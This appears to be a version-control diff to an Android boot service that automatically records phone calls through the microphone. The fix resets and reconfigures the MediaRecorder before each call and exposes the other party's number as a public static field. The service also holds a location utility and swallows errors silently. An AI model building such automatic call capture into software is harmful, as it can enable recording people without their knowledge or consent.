@@ -55,15 +55,12 @@ public class BootService extends Service
 	public static LocationUtil locationUtil;
 	private TelephonyManager telManager;
 	private boolean recordStarted = false;
-	private String otherSidePhoneNum = "";
+	public static String otherSidePhoneNum = "";
 	private static MediaRecorder recorder;
 	private String DEFAULT_PHONE_RECORD_DIR = FileCtrl.getDefaultDirStr();
 	
 	static {
 		recorder = new MediaRecorder();
-		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-        recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
-        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
 	}
 	
 	private final PhoneStateListener phoneListener = new PhoneStateListener() {
@@ -98,13 +95,17 @@ public class BootService extends Service
             			// Phone call recording
             			try {
                             Date startDate = new Date();
-                            this.fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate); 
+                            this.fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate);
+                            recorder.reset();
+                            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                            recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
+                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                             recorder.setOutputFile(fileFullPath);
                             recorder.prepare();
                             recorder.start();
                             recordStarted = true;
                         } catch(Exception ex) {
-                            
+                            //Log.e(LOGTAG, ex.getMessage());
                         }
                 		break;
                 	}
